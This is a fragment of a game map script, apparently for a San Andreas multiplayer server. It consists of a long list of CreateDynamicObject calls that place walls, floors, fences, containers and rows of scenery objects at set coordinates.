	CreateDynamicObject(19456, 1681.86975, -1607.31580, 14.28410,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 1677.14160, -1602.41028, 14.28410,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19425, 1644.53162, -1602.76733, 12.55590,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 1681.86975, -1616.76038, 14.28410,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 1681.86975, -1626.38208, 14.28410,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 1681.86975, -1636.00183, 14.28410,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 1681.86975, -1645.62268, 14.28410,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 1681.86975, -1717.53101, 14.14010,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(8841, 1638.28784, -1630.96814, 15.76460,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 1637.71814, -1659.97131, 14.28410,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 1677.14172, -1674.35486, 14.14010,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 1667.51294, -1659.96204, 14.28410,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(8841, 1666.92395, -1631.00586, 15.76463,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(10183, 1644.52551, -1630.12000, 12.64400,   0.00000, 0.00000, 135.48000);
	CreateDynamicObject(10183, 1673.17578, -1630.12000, 12.64400,   0.00000, 0.00000, 135.48000);
	CreateDynamicObject(10183, 1660.62646, -1630.12000, 12.64400,   0.00000, 0.00000, -44.58000);
	CreateDynamicObject(19425, 1654.17566, -1602.76733, 12.55590,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19425, 1657.45850, -1602.76733, 12.55590,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19425, 1660.74072, -1659.77429, 12.55590,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19425, 1660.74072, -1602.76733, 12.55590,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19425, 1657.45850, -1659.77429, 12.55590,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19425, 1654.17566, -1659.77429, 12.55590,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19425, 1650.97131, -1659.77429, 12.55590,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19425, 1647.74817, -1659.77429, 12.55590,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19425, 1644.53162, -1659.77429, 12.55590,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(4640, 1640.76636, -1603.54834, 13.92420,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18981, 1669.30005, -1709.86169, 12.08560,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(18981, 1644.69714, -1709.86169, 12.08560,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(18981, 1644.69714, -1686.80103, 12.08560,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(18981, 1669.30005, -1686.80103, 12.08560,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19456, 1681.86975, -1655.24219, 14.28410,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 1681.86975, -1707.91150, 14.14010,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 1681.88367, -1698.29260, 14.14010,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 1681.86975, -1688.68494, 14.14010,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 1632.28455, -1679.10950, 14.14010,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 1677.14172, -1659.96204, 14.28410,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 1667.51343, -1674.37488, 14.14010,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 1657.88000, -1674.35486, 14.14010,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 1648.24585, -1674.35486, 14.14010,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 1638.61499, -1674.35486, 14.14010,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 1681.86975, -1679.08313, 14.14011,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 1632.28455, -1688.68494, 14.14010,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 1632.28455, -1707.91150, 14.14010,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 1632.28455, -1717.53101, 14.14010,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19437, 1632.99609, -1674.35486, 14.14010,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1660, 1635.15479, -1703.60156, 9.89080,   -16.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 1632.28455, -1698.29260, 14.14010,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 1648.14539, -1698.26050, 14.14010,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 1657.77844, -1698.26050, 14.14010,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 1667.39246, -1698.26050, 14.14010,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 1677.01685, -1698.26050, 14.14010,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 1677.01685, -1698.43848, 14.14010,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 1677.01685, -1698.08252, 14.14010,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 1667.39246, -1698.08252, 14.14010,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 1657.77844, -1698.08252, 14.14010,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 1648.14539, -1698.08252, 14.14010,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 1667.39246, -1698.43848, 14.14010,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 1657.77844, -1698.43848, 14.14010,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 1648.14539, -1698.43848, 14.14010,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 1662.62793, -1703.33655, 14.14010,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 1662.45007, -1703.33655, 14.14010,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 1662.27209, -1703.33655, 14.14010,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(11696, 1321.72949, -1447.86328, 24.40520,   0.00000, 0.00000, 0.82001);
	CreateDynamicObject(1412, 1782.95251, -1817.38208, 13.76840,   0.00000, 0.00000, 120.06006);
	CreateDynamicObject(1412, 2278.08350, -2060.93066, 13.76840,   0.00000, 0.00000, -45.00000);
	CreateDynamicObject(1412, 2274.42285, -2057.28076, 13.76840,   0.00000, 0.00000, -45.00000);
	CreateDynamicObject(1412, 2270.75562, -2053.61133, 13.76840,   0.00000, 0.00000, -45.00000);
	CreateDynamicObject(1412, 2267.10083, -2049.95776, 13.76840,   0.00000, 0.00000, -45.00000);
	CreateDynamicObject(1412, 2263.43555, -2046.29028, 13.76840,   0.00000, 0.00000, -45.00000);
	CreateDynamicObject(1412, 2259.77832, -2042.63574, 13.76840,   0.00000, 0.00000, -45.00000);
	CreateDynamicObject(1412, 2256.12573, -2038.97620, 13.76840,   0.00000, 0.00000, -45.00000);
	CreateDynamicObject(1412, 2252.47656, -2035.31982, 13.76840,   0.00000, 0.00000, -45.00000);
	CreateDynamicObject(1412, 2248.81616, -2031.64783, 13.76840,   0.00000, 0.00000, -45.00000);
	CreateDynamicObject(1412, 2245.15747, -2027.98499, 13.76840,   0.00000, 0.00000, -45.00000);
	CreateDynamicObject(1412, 2242.69824, -2025.49219, 13.76840,   0.00000, 0.00000, -45.00000);
	CreateDynamicObject(1412, 2285.41016, -2064.54736, 13.76840,   0.00000, 0.00000, 44.63998);
	CreateDynamicObject(1412, 2289.08813, -2060.91943, 13.76840,   0.00000, 0.00000, 44.63998);
	CreateDynamicObject(1412, 2292.76709, -2057.29053, 13.76840,   0.00000, 0.00000, 44.63998);
	CreateDynamicObject(1412, 2296.67505, -2053.92041, 13.76840,   0.00000, 0.00000, 36.89997);
	CreateDynamicObject(1412, 2300.86621, -2050.89966, 13.76840,   0.00000, 0.00000, 34.55993);
	CreateDynamicObject(1412, 2305.25781, -2048.16211, 13.76840,   0.00000, 0.00000, 28.97993);
	CreateDynamicObject(1412, 2309.86011, -2045.78003, 13.76840,   0.00000, 0.00000, 25.79992);
	CreateDynamicObject(1412, 2314.63330, -2043.75220, 13.76840,   0.00000, 0.00000, 20.75994);
	CreateDynamicObject(1412, 2319.54004, -2042.13269, 13.76840,   0.00000, 0.00000, 15.59995);
	CreateDynamicObject(1412, 2324.56738, -2040.86560, 13.76840,   0.00000, 0.00000, 12.65995);
	CreateDynamicObject(1412, 2329.68677, -2040.01111, 13.76840,   0.00000, 0.00000, 6.35995);
	CreateDynamicObject(1412, 2334.82544, -2039.50696, 13.76840,   0.00000, 0.00000, 4.67995);
	CreateDynamicObject(1412, 2339.99438, -2039.29187, 13.76840,   0.00000, 0.00000, -0.00005);
	CreateDynamicObject(1412, 2345.16992, -2039.28369, 13.76840,   0.00000, 0.00000, -0.00005);
	CreateDynamicObject(1412, 2348.58911, -2039.29309, 13.76840,   0.00000, 0.00000, -0.00005);
	CreateDynamicObject(8390, 1881.62964, -1672.37598, 31.88010,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(11696, 1965.07666, -1376.81226, 16.90520,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3283, 2356.06641, -2025.61865, 13.09127,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1410, 2350.37231, -2021.13843, 13.10539,   0.00000, 0.00000, -164.46002);
	CreateDynamicObject(1410, 2345.88013, -2022.38306, 13.10539,   0.00000, 0.00000, -164.46002);
	CreateDynamicObject(1410, 2354.86743, -2019.89319, 13.10539,   0.00000, 0.00000, -164.46002);
	CreateDynamicObject(1410, 2359.33594, -2018.63647, 13.10539,   0.00000, 0.00000, -164.46002);
	CreateDynamicObject(3284, 2337.33643, -2033.84143, 14.45210,   0.00000, 0.00000, 3.36000);
	CreateDynamicObject(3285, 2304.34692, -2028.86951, 14.41068,   0.00000, 0.00000, -87.59998);
	CreateDynamicObject(3242, 2273.61670, -2046.24744, 14.54316,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3283, 2321.70996, -2036.82715, 13.09130,   0.00000, 0.00000, -78.70000);
	CreateDynamicObject(3169, 2253.85986, -2033.48132, 12.51140,   0.00000, 0.00000, 44.76001);
	CreateDynamicObject(3171, 2292.34131, -2054.28247, 12.51457,   0.00000, 0.00000, -44.40000);
	CreateDynamicObject(3169, 2279.14844, -2031.25745, 12.51140,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3171, 2292.37476, -2042.65454, 12.51457,   0.00000, 0.00000, 17.04000);
	CreateDynamicObject(3171, 2299.53589, -2047.90759, 12.51457,   0.00000, 0.00000, -62.39999);
	CreateDynamicObject(3171, 2291.22192, -2033.61633, 12.51457,   0.00000, 0.00000, 168.77997);
	CreateDynamicObject(3172, 2283.44214, -2057.57178, 12.51130,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3169, 2264.12061, -2034.76526, 12.51135,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3285, 2306.31665, -2039.12305, 14.41068,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(989, 1964.18335, -2189.98950, 14.31760,   0.00000, 0.00000, 106.80020);
	CreateDynamicObject(989, 1958.69336, -2189.98950, 14.31760,   0.00000, 0.00000, 106.80020);
	CreateDynamicObject(620, -5298.06982, 3695.80176, -2974.46533,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19430, 2458.73462, -1778.34314, 12.73200,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19430, 2516.90283, -1784.03271, 12.90070,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(11696, 71.90484, -1456.08325, 24.40520,   0.00000, 0.00000, 55.00000);
	CreateDynamicObject(11696, -10.96934, -1567.24219, 24.40520,   0.00000, 0.00000, 55.00000);
	CreateDynamicObject(11696, -107.62069, -1704.27625, 24.40520,   0.00000, 0.00000, 55.00000);
	CreateDynamicObject(11696, -209.00693, -1854.69202, 24.40520,   0.00000, 0.00000, 55.00000);
	CreateDynamicObject(11696, -244.52165, -2207.01538, 24.40520,   0.00000, 0.00000, 106.24002);
	CreateDynamicObject(11696, -172.85297, -2373.68262, 24.40520,   0.00000, 0.00000, 131.56003);
	CreateDynamicObject(11696, -83.46830, -2480.54883, 24.40520,   0.00000, 0.00000, 131.56003);
	CreateDynamicObject(11696, -20.59953, -2591.68018, 24.40520,   0.00000, 0.00000, 103.72004);
	CreateDynamicObject(11696, -21.50649, -2714.43701, 24.40520,   0.00000, 0.00000, 84.04003);
	CreateDynamicObject(11696, -39.35622, -2839.67993, 24.40520,   0.00000, 0.00000, 84.04003);
	CreateDynamicObject(11696, -52.62943, -2956.18335, 24.40520,   0.00000, 0.00000, 84.04003);
	CreateDynamicObject(11696, -94.59557, -3875.36841, 24.40520,   0.00000, 0.00000, 84.04003);
	CreateDynamicObject(11696, -60.38950, -3126.20166, 24.40520,   0.00000, 0.00000, 84.04003);
	CreateDynamicObject(11696, -65.35696, -3273.42163, 24.40520,   0.00000, 0.00000, 84.04003);
	CreateDynamicObject(11696, -62.34494, -3428.70605, 24.40520,   0.00000, 0.00000, 84.04003);
	CreateDynamicObject(11696, -67.51096, -3592.71680, 24.40520,   0.00000, 0.00000, 84.04003);
	CreateDynamicObject(11696, -85.57310, -3722.01147, 24.40520,   0.00000, 0.00000, 84.04003);
	CreateDynamicObject(11696, 24.97759, -4028.58008, 24.40520,   0.00000, 0.00000, 168.27985);
	CreateDynamicObject(11696, 2097.17896, -3239.80298, 24.40520,   0.00000, 0.00000, 168.27985);
	CreateDynamicObject(11696, 154.09096, -4055.80005, 24.40520,   0.00000, 0.00000, 168.27985);
	CreateDynamicObject(11696, 309.10309, -4080.72363, 24.40520,   0.00000, 0.00000, 168.27985);
	CreateDynamicObject(11696, 463.09509, -4109.82861, 24.40520,   0.00000, 0.00000, 168.27985);
	CreateDynamicObject(11696, 625.47052, -4132.21924, 24.40520,   0.00000, 0.00000, 168.27985);
	CreateDynamicObject(11696, 738.86707, -4155.61963, 24.40520,   0.00000, 0.00000, 168.27985);
	CreateDynamicObject(11696, 870.00330, -4178.23584, 24.40520,   0.00000, 0.00000, 168.27985);
	CreateDynamicObject(11696, 1025.39355, -4206.72266, 24.40520,   0.00000, 0.00000, 168.27985);
	CreateDynamicObject(11696, 1161.19263, -4228.72412, 24.40520,   0.00000, 0.00000, 168.27985);
	CreateDynamicObject(11696, 1303.07300, -4255.37598, 24.40520,   0.00000, 0.00000, 168.27985);
	CreateDynamicObject(11696, 1448.59595, -4283.24268, 24.40520,   0.00000, 0.00000, 168.27985);
	CreateDynamicObject(11696, 1572.09412, -4311.03467, 24.40520,   0.00000, 0.00000, 168.27985);
	CreateDynamicObject(11696, 4172.79883, -4327.55273, 24.40520,   0.00000, 0.00000, 180.27980);
	CreateDynamicObject(11696, 2866.52466, -1543.10132, -3.00000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(11696, 3036.99683, -1534.54797, -3.00000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(11696, 3198.52734, -1529.29163, -3.00000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(11696, 3370.94629, -1514.54578, -3.00000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(11696, 3535.31958, -1511.62427, -3.00000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(11696, 3704.05737, -1501.90918, -3.00000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(11696, 3865.22168, -1492.50342, -3.00000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(11696, 4024.17993, -1480.86816, -3.00000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(11696, 4174.99072, -1596.63110, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4179.21777, -1745.78870, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4184.36182, -1891.70325, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4189.53906, -2038.56873, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4195.33984, -2203.14355, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4200.75830, -2356.85400, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4206.18750, -2510.87354, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4212.31055, -2684.59082, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4217.67188, -2836.67212, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4222.85938, -2983.82568, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4228.85889, -3154.03735, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4234.78516, -3322.23389, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4240.61328, -3487.58252, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4246.54688, -3655.97656, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4252.34619, -3820.57739, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4257.98438, -3980.52637, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4263.91016, -4148.67529, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4269.79297, -4315.60693, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4275.72363, -4483.85107, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4280.97217, -4632.73682, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4286.24658, -4782.35547, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4291.79004, -4939.63330, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4288.53369, -5102.08252, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4290.32813, -5254.96387, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4292.37305, -5429.19922, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4294.31250, -5594.56396, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4296.06104, -5743.52637, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4297.72021, -5884.77051, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4299.53125, -6039.06250, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4303.58252, -6189.91309, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4307.17822, -6323.78467, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4310.68506, -6466.33398, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4313.35645, -6622.66797, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4315.58691, -6770.05518, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4317.90869, -6923.43896, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4319.73730, -7062.25635, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4322.25195, -7228.29443, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4324.78223, -7395.44873, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4327.06104, -7546.02734, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4329.53174, -7709.11963, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4332.61475, -7855.93701, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4335.71729, -8003.70703, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4340.18945, -8157.44043, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4344.85059, -8315.03418, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4349.44629, -8470.39648, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4354.76709, -8629.04785, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4360.50244, -8790.48340, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4365.73584, -8937.79395, -3.05707,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 4371.10693, -9088.98242, -3.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11696, 1723.55029, -4336.01025, 24.40520,   0.00000, 0.00000, 180.27980);
	CreateDynamicObject(11696, 1878.58582, -4347.13623, 24.40520,   0.00000, 0.00000, 180.27980);
	CreateDynamicObject(11696, 2017.01392, -4350.05664, 24.40520,   0.00000, 0.00000, 180.27980);
	CreateDynamicObject(11696, 2156.77686, -4349.07178, 24.40520,   0.00000, 0.00000, 180.27980);
	CreateDynamicObject(11696, 2308.71851, -4347.39209, 24.40520,   0.00000, 0.00000, 180.27980);
	CreateDynamicObject(11696, 2457.11206, -4345.75342, 24.40520,   0.00000, 0.00000, 180.27980);
	CreateDynamicObject(11696, 2610.43823, -4344.05859, 24.40520,   0.00000, 0.00000, 180.27980);
	CreateDynamicObject(11696, 2759.49536, -4342.41309, 24.40520,   0.00000, 0.00000, 180.27980);
	CreateDynamicObject(11696, 2921.25952, -4340.62598, 24.40520,   0.00000, 0.00000, 180.27980);
	CreateDynamicObject(11696, 3077.42993, -4339.65674, 24.40520,   0.00000, 0.00000, 180.27980);
	CreateDynamicObject(11696, 3236.46875, -4337.89990, 24.40520,   0.00000, 0.00000, 180.27980);
	CreateDynamicObject(11696, 3376.22656, -4336.35547, 24.40520,   0.00000, 0.00000, 180.27980);
	CreateDynamicObject(11696, 3536.66479, -4334.58252, 24.40520,   0.00000, 0.00000, 180.27980);
	CreateDynamicObject(11696, 3680.96021, -4332.98779, 24.40520,   0.00000, 0.00000, 180.27980);
	CreateDynamicObject(11696, 3850.18237, -4331.11816, 24.40520,   0.00000, 0.00000, 180.27980);
	CreateDynamicObject(11696, 4014.04639, -4329.30713, 24.40520,   0.00000, 0.00000, 180.27980);
	CreateDynamicObject(3578, 1023.70654, -2052.65576, 12.82849,   0.00000, 0.00000, 34.49998);
	CreateDynamicObject(3578, 1015.82025, -2059.38867, 12.82849,   0.00000, 0.00000, 47.76000);
	CreateDynamicObject(3578, 1009.06616, -2067.36206, 12.82849,   0.00000, 0.00000, 51.48003);
	CreateDynamicObject(3578, 1017.70758, -2089.56763, 12.82849,   0.00000, 0.00000, 84.23987);
	CreateDynamicObject(3578, 1003.13062, -2075.95557, 12.82849,   0.00000, 0.00000, 60.06006);
	CreateDynamicObject(3578, 1020.83954, -2079.89404, 12.82849,   0.00000, 0.00000, 60.06006);
	CreateDynamicObject(9339, 967.11926, -2131.74854, 12.29170,   0.00000, 0.00000, 324.39444);
	CreateDynamicObject(9339, 996.16791, -2088.52490, 12.29170,   0.00000, 0.00000, 331.71414);
	CreateDynamicObject(3578, 1021.40826, -2067.10547, 12.82849,   0.00000, 0.00000, 35.34000);
	CreateDynamicObject(3578, 1013.85382, -2073.87549, 12.82849,   0.00000, 0.00000, 48.66006);
	CreateDynamicObject(3578, 1008.63794, -2082.38965, 12.82849,   0.00000, 0.00000, 68.33997);
	CreateDynamicObject(11696, 1324.55713, -1451.31067, 24.40520,   0.00000, 0.00000, 88.00005);
	CreateDynamicObject(19447, 1207.89905, -1557.44165, 12.46010,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19447, 1211.39807, -1557.44165, 12.46010,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19447, 1214.92859, -1557.41113, 12.46010,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19447, 1225.38672, -1557.44165, 12.46010,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19447, 1218.39185, -1557.44165, 12.46010,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19447, 1221.88696, -1557.44165, 12.46010,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19447, 1228.88660, -1557.44165, 12.46010,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19447, 1232.38452, -1557.44165, 12.46010,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19447, 1207.89905, -1547.81262, 12.46010,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19447, 1211.39807, -1547.81262, 12.46010,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19447, 1214.89587, -1547.81262, 12.46010,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19447, 1218.39185, -1547.81262, 12.46010,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19447, 1207.89905, -1538.17688, 12.46010,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19447, 1211.39807, -1538.17688, 12.46010,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19447, -1538.17688, -1547.81262, 12.46010,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19447, 1214.89587, -1538.17688, 12.46010,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19447, 1218.39185, -1538.17688, 12.46010,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19447, 1207.89905, -1528.54651, 12.46010,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19447, 1207.89905, -1518.91650, 12.46010,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19447, 1207.89905, -1509.28687, 12.46010,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19447, 1211.39807, -1528.54651, 12.46010,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19447, 1214.89587, -1528.54651, 12.46010,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19447, 1211.39807, -1518.91650, 12.46010,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19650, 1407.08789, -1569.76672, 11.84814,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(11015, 1449.75964, -1573.28662, 14.60153,   0.00000, 0.00000, 360.50565);
	CreateDynamicObject(19456, 1463.29358, -1582.34912, 13.80219,   0.00000, 0.00000, 90.32124);
	CreateDynamicObject(19456, 1472.89343, -1582.31226, 13.80219,   0.00000, 0.00000, 90.32124);
	CreateDynamicObject(19456, 1482.46313, -1582.27075, 13.80219,   0.00000, 0.00000, 90.32124);
	CreateDynamicObject(19456, 1492.03870, -1582.22278, 13.80219,   0.00000, 0.00000, 90.32124);
	CreateDynamicObject(19456, 1496.88623, -1577.46985, 13.80219,   0.00000, 0.00000, -0.15875);
	CreateDynamicObject(19456, 1449.12317, -1529.38391, 13.80219,   0.00000, 0.00000, 164.48122);
	CreateDynamicObject(19456, 1446.67786, -1538.32129, 13.80219,   0.00000, 0.00000, 164.48122);
	CreateDynamicObject(19456, 1444.21082, -1547.36206, 13.80219,   0.00000, 0.00000, 164.48122);
	CreateDynamicObject(19425, 1442.64771, -1553.68140, 12.54224,   0.00000, 0.00000, 74.81998);
	CreateDynamicObject(19425, 1441.80859, -1556.92542, 12.54224,   0.00000, 0.00000, 76.07992);
	CreateDynamicObject(19425, 1440.73523, -1562.72205, 12.54224,   0.00000, 0.00000, 82.61996);
	CreateDynamicObject(19425, 1441.15698, -1560.02795, 12.54224,   0.00000, 0.00000, 79.91994);
	CreateDynamicObject(19456, 1439.95935, -1569.01624, 13.80219,   0.00000, 0.00000, 175.94147);
	CreateDynamicObject(19456, 1439.56421, -1577.47644, 13.80219,   0.00000, 0.00000, 179.96146);
	CreateDynamicObject(19456, 1444.40771, -1581.85974, 13.80219,   0.00000, 0.00000, 94.28140);
	CreateDynamicObject(1556, 1447.46521, -1582.13733, 12.73133,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3458, 1475.68970, -1579.58459, 13.94734,   0.00000, 0.00000, 0.61520);
	CreateDynamicObject(713, 1488.62378, -1545.12610, 11.45700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 1496.88062, -1568.53210, 13.80219,   0.00000, 0.00000, -0.15875);
	CreateDynamicObject(19456, 1496.88684, -1559.42114, 13.80219,   0.00000, 0.00000, -0.15875);
	CreateDynamicObject(19456, 1496.92188, -1549.99255, 13.80219,   0.00000, 0.00000, -0.15875);
	CreateDynamicObject(19456, 1496.95190, -1541.00342, 13.80219,   0.00000, 0.00000, -0.15875);
	CreateDynamicObject(19447, 1214.68005, -1518.97485, 12.46010,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19447, 1207.87793, -1499.78613, 12.46010,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19447, 1207.84351, -1490.18652, 12.46010,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19447, 1207.86438, -1480.83667, 12.46010,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19447, 1207.84485, -1471.13086, 12.46010,   0.00000, 90.00000, 0.00000);
